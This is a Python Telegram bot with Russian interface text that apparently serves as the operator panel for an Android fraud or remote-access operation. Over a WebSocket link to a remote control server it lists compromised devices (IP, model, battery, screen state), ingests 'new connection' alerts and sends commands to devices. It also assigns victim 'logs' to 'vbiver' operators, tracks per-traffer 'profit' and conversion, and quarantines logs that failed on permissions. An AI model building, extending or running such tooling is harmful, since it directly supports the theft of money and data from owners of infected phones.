import os
import re
import json
import asyncio
import logging
import contextlib
from pathlib import Path
from datetime import datetime, timezone, timedelta
from collections import Counter

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, BotCommand,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
import websockets

# ----------------- CONFIG -----------------
load_dotenv(dotenv_path=Path(__file__).with_name(".env"))

# Telegram
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()}
ALLOWED_CHAT_IDS = {int(x) for x in os.getenv("ALLOWED_CHAT_IDS", "").split(",") if x.strip().lstrip("-").isdigit()}

# Roles
FOUNDER_IDS = {int(x) for x in os.getenv("FOUNDER_IDS", "").split(",") if x.strip().isdigit()}
VBIVER_IDS  = {int(x) for x in os.getenv("VBIVER_IDS", "").split(",") if x.strip().isdigit()}
TRAFFER_IDS = {int(x) for x in os.getenv("TRAFFER_IDS", "").split(",") if x.strip().isdigit()}

ROLE_TRAFFER = 1
ROLE_VBIVER  = 2
ROLE_FOUNDER = 3

# WebSocket
WS_URL        = os.getenv("WS_URL", "")
AUTH_TYPE     = (os.getenv("WS_AUTH_TYPE", "cookie") or "cookie").lower()  # cookie|bearer|protocol|none
WS_TOKEN      = os.getenv("WS_TOKEN", "")
WS_COOKIE     = os.getenv("WS_COOKIE", "")
WS_ORIGIN     = os.getenv("WS_ORIGIN", "https://zam.claydc.top")
WS_INIT_AUTH_JSON = os.getenv("WS_INIT_AUTH_JSON", "")
WS_AUTH_OK_EVENT  = (os.getenv("WS_AUTH_OK_EVENT", "welcome") or "welcome").strip().lower()

# Optional headers
WS_USER_AGENT      = os.getenv("WS_USER_AGENT", "")
WS_ACCEPT_LANGUAGE = os.getenv("WS_ACCEPT_LANGUAGE", "")
WS_CACHE_CONTROL   = os.getenv("WS_CACHE_CONTROL", "")
WS_PRAGMA          = os.getenv("WS_PRAGMA", "")

# Business
BIG_PROFIT = int(os.getenv("BIG_PROFIT", "5000"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("clonnex")

# ----------------- ACCESS -----------------
def allowed_chat(chat_id: int) -> bool:
    return (not ALLOWED_CHAT_IDS) or (chat_id in ALLOWED_CHAT_IDS)

def role_level(uid: int) -> int:
    if uid in FOUNDER_IDS:
        return ROLE_FOUNDER
    if uid in VBIVER_IDS:
        return ROLE_VBIVER
    if uid in TRAFFER_IDS:
        return ROLE_TRAFFER
    return 0

# ----------------- STATE -----------------
DEVICES: dict[str, dict] = {}
LOGS: dict[str, dict] = {}  # uuid -> {raw, quarantined, trafer_id, meta, ts, assigned_to, profit...}
BLACKLIST_UUIDS: set[str] = set()

RE_DENIED = re.compile(r"\bpermission\s+denied\b", re.I)

# ----------------- UI -----------------
def kb_main(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚙️ Ворк-панель", callback_data="menu:work")]
    ])

def kb_work(uid: int) -> InlineKeyboardMarkup:
    lvl = role_level(uid)
    rows = []
    if lvl >= ROLE_TRAFFER:
        rows.append([InlineKeyboardButton(text="📬 Трафф-панель", callback_data="work:tr")])
    if lvl >= ROLE_VBIVER:
        rows.append([InlineKeyboardButton(text="🧲 Вбив-панель", callback_data="work:vb")])
    if lvl >= ROLE_FOUNDER:
        rows.append([InlineKeyboardButton(text="🛠 Админ-панель", callback_data="work:admin")])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:root")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def kb_tr(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✉️ Мои входящие",  callback_data="tr:inbox")],
        [InlineKeyboardButton(text="🚫 Ошибки доступа", callback_data="tr:denied")],
        [InlineKeyboardButton(text="📈 Источники",      callback_data="tr:sources")],
        [InlineKeyboardButton(text="📊 Статистика",     callback_data="tr:stats:24h")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:work")],
    ])

def kb_vb(uid: int, has_active: bool) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text="🧲 Получить лог", callback_data="vb:get")],
            [InlineKeyboardButton(text="📦 Мой лог",      callback_data="vb:my")]]
    if has_active:
        rows.append([
            InlineKeyboardButton(text="💰 Профит",    callback_data="vb:profit"),
            InlineKeyboardButton(text="🔓 Освободить", callback_data="vb:free"),
        ])
    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="menu:work")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def setup_bot_commands(bot: Bot) -> None:
    await bot.set_my_commands([
        BotCommand(command="start",   description="Запуск"),
        BotCommand(command="menu",    description="Ворк-панель"),
        BotCommand(command="ping",    description="Проверка"),
        BotCommand(command="devices", description="Список устройств"),
        BotCommand(command="device",  description="Карточка устройства"),
        BotCommand(command="whoami",  description="Мой user_id"),
        BotCommand(command="whereami",description="ID чата"),
    ])

# ----------------- WS CLIENT -----------------
class WSClient:
    def __init__(self, bot: Bot) -> None:
        self.ws: websockets.WebSocketClientProtocol | None = None
        self.auth_ok = False
        self.bot = bot

    def _conn_args(self) -> dict:
        headers: dict[str, str] = {}
        if AUTH_TYPE == "bearer" and WS_TOKEN:
            headers["Authorization"] = f"Bearer {WS_TOKEN}"
        if AUTH_TYPE == "cookie" and WS_COOKIE:
            headers["Cookie"] = WS_COOKIE
        if WS_ORIGIN:          headers["Origin"] = WS_ORIGIN
        if WS_USER_AGENT:      headers["User-Agent"] = WS_USER_AGENT
        if WS_ACCEPT_LANGUAGE: headers["Accept-Language"] = WS_ACCEPT_LANGUAGE
        if WS_CACHE_CONTROL:   headers["Cache-Control"] = WS_CACHE_CONTROL
        if WS_PRAGMA:          headers["Pragma"] = WS_PRAGMA

        k: dict = {}
        if headers:
            k["extra_headers"] = headers
        if AUTH_TYPE == "protocol" and WS_TOKEN:
            toks = [t.strip() for t in WS_TOKEN.split(",") if t.strip()]
            k["subprotocols"] = toks or [WS_TOKEN]
        return k

    async def run(self) -> None:
        if not WS_URL:
            log.error("WS_URL пуст")
            await asyncio.Future()

        backoff = 1
        while True:
            try:
                log.info("WS connecting → %s", WS_URL)
                async with websockets.connect(
                    WS_URL,
                    ping_interval=20, ping_timeout=20,
                    open_timeout=8, close_timeout=5,
                    max_size=None,
                    **self._conn_args(),
                ) as ws:
                    self.ws = ws
                    self.auth_ok = False
                    log.info("WS connected; protocol=%s", ws.subprotocol or "-")

                    # отправляем init-кадр если задан
                    if WS_INIT_AUTH_JSON:
                        try:
                            await ws.send(WS_INIT_AUTH_JSON)
                            log.info("WS sent init auth json")
                        except Exception as e:
                            log.warning("send init auth failed: %r", e)

                    asyncio.create_task(self._auth_watchdog())

                    async for raw in ws:
                        data = self._parse_frame(raw)
                        t = (data.get("type") or "").lower()
                        evt = (data.get("event") or "").lower()

                        if not self.auth_ok:
                            ok_by_env = (WS_AUTH_OK_EVENT and (t == WS_AUTH_OK_EVENT or evt == WS_AUTH_OK_EVENT))
                            ok_by_known = evt in {"welcome","clients_update"} or t in {"device_info","apps_list","log_upsert"}
                            if ok_by_env or ok_by_known:
                                self.auth_ok = True
                                log.info("AUTH OK ✅")

                        await self._handle(data)

            except asyncio.TimeoutError:
                log.warning("WS open timeout; reconnect in %ss", backoff)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 30)
            except websockets.InvalidStatusCode as e:
                hdrs = getattr(e, "headers", None)
                log.warning("WS InvalidStatusCode: %s; headers=%s; reconnect in %ss", e.status_code, hdrs, backoff)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 30)
            except Exception as e:
                log.warning("WS error: %r; reconnect in %ss", e, backoff)
                await asyncio.sleep(backoff); backoff = min(backoff*2, 30)

    async def _auth_watchdog(self) -> None:
        await asyncio.sleep(5)
        if not self.auth_ok:
            log.error("AUTH not confirmed in 5s — проверь .env (cookie/init json)")

    def _parse_frame(self, raw: str) -> dict:
        # кадр может быть JSON или “красивый текст” (как твой пример)
        try:
            return json.loads(raw)
        except Exception:
            return {"type": "text", "text": raw}

    async def _handle(self, data: dict) -> None:
        evt = (data.get("event") or "").lower()
        typ = (data.get("type") or "").lower()

        # обновление устройств
        if evt == "clients_update" and isinstance(data.get("clients"), list):
            for c in data["clients"]:
                did = c.get("ID") or c.get("UUID") or c.get("id") or c.get("uuid")
                if not did: continue
                DEVICES.setdefault(did, {}).update({
                    "name":          c.get("DeviceName") or c.get("DeviceModel"),
                    "model":         c.get("DeviceModel"),
                    "android":       c.get("AndroidVersion"),
                    "battery":       c.get("BatteryLevel"),
                    "ip":            c.get("IP") or c.get("IPAddress"),
                    "is_online":     bool(c.get("IsConnected")),
                    "screen":        "on" if c.get("IsScreenOn") else "off",
                    "worker":        c.get("worker_name"),
                    "client":        c.get("ClientType"),
                    "connection":    c.get("ConnectionMethod") or c.get("ConnectionType"),
                    "last_seen":     c.get("FormattedLastSeen") or c.get("LastSeen"),
                    "connected_for": c.get("FormatTimeConnected"),
                    "webview_url":   c.get("webview_url"),
                })
            log.info("[cache] devices updated: %d", len(DEVICES))
            return

        # “красивый текст” — 🌟 Новый коннект 🌟
        if typ == "text" and isinstance(data.get("text"), str):
            self._maybe_ingest_pretty_connect(data["text"])
            return

        # стандартный апсерта логов (если бекенд шлёт JSON)
        if evt == "log_upsert" or typ == "log_upsert":
            self._ingest_log_json(data)
            return

        if evt == "welcome":
            log.info("[WS recv] %s", data)
            return

        log.info("[WS recv] %s", data)

    def _maybe_ingest_pretty_connect(self, txt: str) -> None:
        """
        Парсер твоего текстового формата “🌟 Новый коннект 🌟”.
        Безопасно пытаемся вытащить uuid + мету.
        """
        if "Новый коннект" not in txt:
            return

        # простые вырезалки по меткам
        def cut(after: str):
            i = txt.find(after)
            if i == -1: return ""
            j = txt.find("\n", i)
            line = txt[i + len(after): j if j != -1 else None].strip()
            return line

        model   = cut("⚙️ Модель:") or cut("Модель:")
        android = cut("ℹ️ Версия Android:") or cut("Версия Android:")
        ip      = cut("🔗 IP-Address:") or cut("IP-Address:")
        worker  = cut("👷 Воркер:") or cut("Воркер:")
        uuid    = cut("🆔 ID:") or cut("ID:")
        # вытащим цифры TG id из “(TG: 8147...)”
        tg_id = None
        if "TG:" in worker:
            try:
                tg_id = int("".join(ch for ch in worker.split("TG:")[-1] if ch.isdigit()))
            except Exception:
                tg_id = None
            worker = worker.split("(")[0].strip()

        if not uuid:
            return

        raw_norm = " ".join(txt.lower().replace("•", "").split())
        denied = bool(RE_DENIED.search(raw_norm))

        LOGS[uuid] = {
            "uuid": uuid,
            "raw": txt,
            "quarantined": denied,
            "assigned_to": None,
            "assigned_at": None,
            "trafer_id": tg_id,  # если трафферский tg прислан
            "worker": worker or None,
            "operator": None,
            "meta": {"model": model or None, "android": android or None, "ip": ip or None},
            "ts": datetime.now(timezone.utc).isoformat(),
            "profit": 0.0, "profit_note": "", "profited_at": None,
        }

        if denied and tg_id:
            with contextlib.suppress(Exception):
                asyncio.create_task(self.bot.send_message(
                    tg_id,
                    f"🚫 <b>Лог с ошибкой доступа</b>\nUUID: <code>{uuid}</code>\nОбнаружено: <code>permission denied</code>",
                    parse_mode="HTML"
                ))

    def _ingest_log_json(self, data: dict) -> None:
        uuid = data.get("uuid") or data.get("UUID")
        if not uuid: return
        raw   = data.get("raw") or ""
        meta  = data.get("meta") or {}
        worker = data.get("worker") or meta.get("worker")
        operator = data.get("operator") or meta.get("operator")
        trafer_uid = data.get("traffer_user_id") or meta.get("traffer_user_id")
        ts = data.get("ts") or datetime.now(timezone.utc).isoformat()

        raw_norm = " ".join(str(raw).lower().replace("•", "").split())
        denied = bool(RE_DENIED.search(raw_norm))

        LOGS[uuid] = {
            "uuid": uuid,
            "raw": raw,
            "quarantined": denied,
            "assigned_to": None,
            "assigned_at": None,
            "trafer_id": trafer_uid,
            "worker": worker,
            "operator": operator,
            "meta": meta,
            "ts": ts,
            "profit": 0.0, "profit_note": "", "profited_at": None,
        }

    async def send(self, obj: dict) -> None:
        if not self.ws:
            log.warning("WS not connected; drop send: %s", obj)
            return
        await self.ws.send(json.dumps(obj))
        log.info("[WS send] %s", obj)

# ----------------- STATS HELPERS -----------------
def _parse_iso(ts: str | None):
    if not ts: return None
    try: return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except Exception: return None

def compute_sources(uid: int, days: int = 30) -> list[str]:
    since = datetime.now(timezone.utc) - timedelta(days=days)
    src = Counter((v.get("meta") or {}).get("source") or "—"
                  for v in LOGS.values()
                  if (v.get("trafer_id") == uid and (_parse_iso(v.get("ts")) or datetime.min.replace(tzinfo=timezone.utc)) >= since))
    return [f"• {k}: {v}" for k, v in src.most_common(5)] or ["—"]

# ----------------- TG HANDLERS -----------------
router = Router()

def ensure(m: Message | CallbackQuery) -> bool:
    chat_id = m.chat.id if isinstance(m, Message) else m.message.chat.id
    return allowed_chat(chat_id)

@router.message(Command("whoami"))
async def whoami(m: Message):
    await m.answer(f"user_id: {m.from_user.id}\nchat_id: {m.chat.id}")

@router.message(Command("whereami"))
async def whereami(m: Message):
    await m.answer(f"chat_id: {m.chat.id}")

@router.message(Command("start"))
async def start(m: Message):
    if not ensure(m): return
    await m.answer("готов. /menu /devices /device <id>", reply_markup=kb_main(m.from_user.id))

@router.message(Command("menu"))
async def menu(m: Message):
    if not ensure(m): return
    lvl = role_level(m.from_user.id)
    if lvl == 0:
        await m.answer("нет доступа"); return
    await m.answer("⚙️ Ворк-панель", reply_markup=kb_work(m.from_user.id))

@router.message(Command("ping"))
async def ping(m: Message):
    if not ensure(m): return
    await m.answer("pong")

@router.message(Command("devices"))
async def devices(m: Message):
    if not ensure(m): return
    if not DEVICES:
        await m.answer("пока нет данных по устройствам")
        return
    lines = []
    for d, v in list(DEVICES.items())[:60]:
        name = v.get("name") or v.get("model") or "?"
        st   = "online" if v.get("is_online") else "offline"
        lines.append(f"• <code>{d}</code> — {name} — {st}")
    if len(DEVICES) > 60:
        lines.append(f"…и ещё {len(DEVICES)-60}")
    await m.answer("\n".join(lines), parse_mode="HTML")

@router.message(Command("device"))
async def device(m: Message, ws: WSClient):
    if not ensure(m): return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        await m.answer("используй: /device <id>"); return
    dev = parts[1].strip()
    v = DEVICES.get(dev, {})
    text = (
        f"<b>{v.get('name') or v.get('model','?')}</b>\n"
        f"Android: {v.get('android','?')} • Статус: {'online' if v.get('is_online') else 'offline'} • Экран: {v.get('screen','?')}\n"
        f"IP: {v.get('ip','?')} • Соединение: {v.get('connection','?')}\n"
        f"Работник: {v.get('worker','-')}\n"
        f"Послед. активность: {v.get('last_seen','-')}\n"
    )
    await m.answer(text, parse_mode="HTML")
    await ws.send({"type": "cmd", "action": "device_info_get", "device_id": dev})

# --- inline nav
@router.callback_query(F.data == "menu:root")
async def cb_root(c: CallbackQuery):
    await c.message.edit_text("главное меню", reply_markup=kb_main(c.from_user.id))
    await c.answer()

@router.callback_query(F.data == "menu:work")
async def cb_work(c: CallbackQuery):
    if role_level(c.from_user.id) == 0:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("⚙️ Ворк-панель", reply_markup=kb_work(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "work:tr")
async def cb_tr(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("📬 Трафф-панель", reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "work:vb")
async def cb_vb(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    has_active = any(v.get("assigned_to") == c.from_user.id for v in LOGS.values())
    await c.message.edit_text("🧲 Вбив-панель", reply_markup=kb_vb(c.from_user.id, has_active)); await c.answer()

@router.callback_query(F.data == "tr:sources")
async def cb_tr_sources(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    lines = compute_sources(c.from_user.id, days=30)
    await c.message.edit_text("📈 Источники (30d):\n" + "\n".join(lines),
                              reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data.startswith("tr:stats:"))
async def cb_tr_stats(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    period = c.data.split(":")[2]
    now = datetime.now(timezone.utc)
    if period == "24h": since = now - timedelta(hours=24)
    elif period == "7d": since = now - timedelta(days=7)
    elif period == "30d": since = now - timedelta(days=30)
    else: since = None

    items = []
    for v in LOGS.values():
        if v.get("trafer_id") != c.from_user.id: continue
        t = v.get("ts"); t = datetime.fromisoformat(t.replace("Z","+00:00")) if t else None
        if since and t and t < since: continue
        items.append(v)

    total = len(items)
    denied = sum(1 for v in items if v.get("quarantined"))
    live = total - denied
    profited = [v for v in items if (v.get("profit") or 0) > 0]
    profit_sum = sum(float(v.get("profit") or 0) for v in profited)
    live_rate = (live/total*100) if total else 0.0
    conv = (len(profited)/total*100) if total else 0.0

    txt = (f"📊 <b>Статистика ({period})</b>\n"
           f"Всего логов: <b>{total}</b>\n"
           f"Denied: <b>{denied}</b> • Live: <b>{live}</b> (<i>{live_rate:.0f}%</i>)\n"
           f"Профиты: <b>{len(profited)}</b> / <b>{profit_sum:.0f}</b> (конв. {conv:.0f}%)")
    await c.message.edit_text(txt, parse_mode="HTML", reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "tr:inbox")
async def cb_tr_inbox(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    await c.message.edit_text("✉️ Входящие: (скоро)\nПока смотри «Источники» и «Статистика».",
                              reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "tr:denied")
async def cb_tr_denied(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_TRAFFER:
        await c.answer("нет доступа", show_alert=True); return
    items = []
    for uuid, v in LOGS.items():
        if not v.get("quarantined"): continue
        tid = v.get("trafer_id")
        if tid and tid != c.from_user.id and c.from_user.id not in FOUNDER_IDS:
            continue
        items.append(f"• <code>{uuid}</code>")
    txt = "🚫 <b>Ошибки доступа</b>\n" + ("\n".join(items) if items else "—")
    await c.message.edit_text(txt, parse_mode="HTML", reply_markup=kb_tr(c.from_user.id)); await c.answer()

@router.callback_query(F.data == "vb:get")
async def cb_vb_get(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    if any(v.get("assigned_to") == c.from_user.id for v in LOGS.values()):
        await c.answer("у тебя уже есть активный лог", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") is None and not v.get("quarantined") and uuid not in BLACKLIST_UUIDS:
            v["assigned_to"] = c.from_user.id
            v["assigned_at"] = datetime.now(timezone.utc).isoformat()
            await c.message.edit_text(
                f"📦 <b>Выдан лог</b>\nUUID: <code>{uuid}</code>",
                parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, True))
            await c.answer("лог выдан"); return
    await c.answer("свободных логов нет", show_alert=True)

@router.callback_query(F.data == "vb:my")
async def cb_vb_my(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            await c.message.edit_text(f"📦 <b>Мой лог</b>\nUUID: <code>{uuid}</code>",
                                      parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, True))
            await c.answer(); return
    await c.answer("активного лога нет", show_alert=True)

@router.callback_query(F.data == "vb:free")
async def cb_vb_free(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("нет доступа", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            v["assigned_to"] = None; v["assigned_at"] = None
            await c.message.edit_text("лог освобождён", reply_markup=kb_vb(c.from_user.id, False)); await c.answer(); return
    await c.answer("активного лога нет", show_alert=True)

# ----------------- APP MAIN -----------------
async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN пуст"); return

    bot = Bot(BOT_TOKEN)
    await setup_bot_commands(bot)

    dp = Dispatcher()
    dp.include_router(router)

    ws = WSClient(bot)
    dp["ws"] = ws  # доступ к ws внутри хендлеров по имени параметра

    ws_task = asyncio.create_task(ws.run())
    try:
        await dp.start_polling(bot, ws=ws)
    finally:
        ws_task.cancel()
        with contextlib.suppress(Exception):
            await ws_task

if __name__ == "__main__":
    asyncio.run(main())
